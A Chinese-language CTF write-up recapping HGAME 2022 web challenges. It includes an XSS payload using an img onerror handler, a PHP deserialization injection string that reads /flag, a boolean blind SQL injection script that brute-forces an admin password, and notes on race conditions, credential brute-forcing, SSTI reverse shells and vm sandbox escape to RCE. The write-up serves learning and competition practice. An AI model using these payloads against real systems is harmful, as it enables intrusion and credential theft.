---
title: HGAME 2022 复盘 writeup
date: 2022-02-19 23:1:00
tags: ctf
---
# HGAME 2022 复盘 writeup by ek1ng


## 序

四周的HGAME结束后又回去看了看没做出的一些题和官方WP还有一些师傅们的wp，发现有些题解法很多，并且有些题虽然我打出了flag但是其实不是特别了解漏洞，也是再复盘一下这些题

## WEB

### 蛛蛛...嘿嘿♥我的蛛蛛（爬虫）

这是一个爬虫题目，题目中的蛛蛛是提示爬虫，这点是当初没发现的，当初是写了这样一个脚本，但是事实上关卡数是未知的，这种自动点击的方式，点到多少还是要看运气，虽然也可以print一下，不过总之不是个很好的方法，然后也是写个爬虫再做一遍

##### 自动化点击脚本

```python
from time import sleep
from selenium import webdriver

# 打开浏览器
wd = webdriver.Chrome(r'chromedriver.exe')
wd.get('https://hgame-spider.vidar.club/915929bc23')
# 让程序停1s保证打开页面后再自动点击
sleep(1)

# 自动点击
for i in range(100):
    # 点击href值不为空的按钮
    for link in wd.find_elements_by_xpath("//*[@href]"):
        try:
            if link.get_attribute('href') != '':
                wd.get(link.get_attribute('href'))
        except:
            pass

```

##### 爬虫

```python
import requests

s = 'https://hgame-spider.vidar.club/915929bc23'


def find(x):
    res = requests.get(s + x)
    print(res.headers)
    print(s + x)
    print(res.text)
    xt = [x for x in res.text.split("\"") if 'key' in x]
    for i in xt:
        find(i)
    if "hgame" in res.text:
        print(res.text)
        return


find("")

```

### At0m的留言板（XSS）

XSS漏洞的利用点在img上，代码没有对img做过滤。

先利用img标签的onerror属性，在content中输出窗体对象的所有属性

```html
<img src=1 onerror="document.getElementsByClassName('content')[0].innerText =
Object.keys(window)">
```

![image-20220219154358680](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220219154358680.png)

然后发现flag的名称是F149_is_Here，在content中输出窗体对象的子属性F149_is_Here的值，拿到flag

```html
<img src=1 onerror="document.getElementsByClassName('content')[0].innerText =
F149_is_Here">
```

![image-20220219154406494](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220219154406494.png)

### 一本单词书（反序列化）

在如何触发反序列化这一点其实当初做题没有特别清楚，因为hint中给出了一个例题，然后依葫芦画瓢得打出了flag，后面也是忙着做后面得题就没机会思考一下，现在回过头再看一下如何通过输入特定数据触发反序列化

先来看看我当初参照hint给出例题的payload

```
{"aaa|O:4:\"Evil\":1:{s:4:\"file\";s:5:\"\/flag\";}aa":"aaaa"}
```

encode 函数将键值型数据编码为 键|serialize(值) 的形式，如 {"a": "1","b": "s"} 编码为 a|s:1:"1";b|s:1:"s" 。

decode 函数会调用 unserialize 函数将编码后的数据恢复，具体来说就是 | 后面到下一个键名之间的内容 换被传递给 unserialize 函数。 

当键中包含 | 符号时，就可以注入任意的反序列化后的数据。

这里我们的键是`aaa|O:4:\"Evil\":1:{s:4:\"file\";s:5:\"\/flag\";}aa`值是`aaaa`，然后encode是给值序列化，并且用|隔开，decode是把|后面的反序列化回去，然后我们传入的键是做了手脚的，后面跟了|O:4:\"Evil\":1:{s:4:\"file\";s:5:\"\/flag\";}aa，在decode反序列化的过程中，会把|后面的都反序列化，那这样的话，Evil类就被反序列化了，然后为什么还要跟个aa，是因为他是键值对嘛，那我们这里后端decode的时候会以为是aaa为键，|O:4:\"Evil\":1:{s:4:\"file\";s:5:\"\/flag\";}反序列化后的对象为值，然后反序列化后Evil对象触发__wakeup这个魔法方法，把flag带出来，然后为什么后面要跟个aa，不跟aa也是可以打出flag，然后跟个aa应该是和后面值aaaa配对，然后|O:4:\"Evil\":1:{s:4:\"file\";s:5:\"\/flag\";}反序列化后的对象和/flag的值会覆盖掉这组键值对，然后所以这个aa和aaaa是看不到的。

然后来看看出题人给的payload

```
{"a|O:4:\"Evil\":2:{s:4:\"file\";s:5:\"/flag\";s:4:\"flag\";N;};b":2}

```

也是一样的道理

### Vidar shop demo（条件竞争）

我当初做题的方法和预期解不太一样，然后也是在校外群看到很多师傅都有各种解法，于是也一一尝试一下看看

第一种解法是官网WP中给出的，连续发送对不同订单的支付请求，只扣一次余额，因为后端的逻辑是查询出用户余额，然后创建订单，最后更新用户余额，后面那个订单只要赶在余额更新前查询余额，那么就会只扣一次钱了

第二种解法是取消未支付订单，这周做法就是后端逻辑问题了，并不是条件竞争，退款未支付商品也是可以成功的

第三种解法校外群内有师傅说可以修改未支付订单号，但是余额的扣除好像是按照商品判断的，你修改成多少钱的商品就是扣多少余额，我按照他的解法是无法复现的，不知道是什么原因。。。。

第四种是爆破账号密码，唔在登录上确实有些问题，一开始出题人还没删测试账号，我直接登进去了，后来问了问后就说这种解法不太行，痛失1血（，后面题目改成了账号密码至少10位，爆破就稍微会难一些，但是还是可行的一种方法，不过爆破账号的前提也是别人打出一个余额超过10000的账号hhh，讲道理也是不太对的方法

### LoginMe （sql布尔盲注）

参考了其他选手的python脚本，我当初是用的sqlmap出的，因为没加什么过滤好像，sqlmap可以直接出，看了看其他人的wp很多也是sqlmap的，然后但是我按照别人的wp的脚本好像无法复现，不知道为啥，反正布尔盲注确实不太懂，针对这个知识学了一下

````python
```
import json
import requests
host = '2aaa006c94.login.summ3r.top:60067'
md5 = ''
data = {"username": "test') and substr(password,1,1)='a' --+", "password": "test"}
for i in range(1,33):
    for j in "0123456789abcdefABCDEF":
        data["username"] = "admin') and substr(password,{},1)='{}' --+".format(i,j)
        r = requests.post('http://' + host + '/login', json=data).text
        info = json.loads(r)['msg']
        print(info)
        if info == 'success!':
            md5 += j
        print(md5)
        break
````



首先是什么是布尔盲注，就是通过构造逻辑判断来得到信息，因为解码只返回true or false，没有直接回显信息，没办法直接union注入爆库名表名字段名这样。

这里就是知道账号是admin，所以就是爆密码，然后一位一位去跑，把这个密码爆出了，大概是这样的流程，然后如果说页面不反回true or false的题型就是需要时间盲注了，需要让逻辑表达式正确时延时返回，这样就可以做到true or false的判断

### SecurityCenter（SSTI）

这个题是我按照预期解做出的，然后看到别人的wp中有人是弹shell然后连接服务器读取的文件，也尝试一下看看

好吧环境好像关了，那只能看看wp学习一下了

主要就是没过滤eval，所以可以想办法弹shell

### Markdown Online（vm沙箱逃逸）

被绕登录的trick卡住了，真是眩晕

传入数组对象，16个元素的数组或者json再套一层，让.length判断正确但是touppercase报错就可以绕过登录

后面就是markdown中没有对html标签过滤，所以说可以传script标签，然后找vm沙箱逃逸的payload，绕过waf过滤就可以get flag了，vm沙箱逃逸主要是因为vm并不是完全安全的，用户输入直接传入就会造成沙箱逃逸，然后实现RCE，可以cat /flag



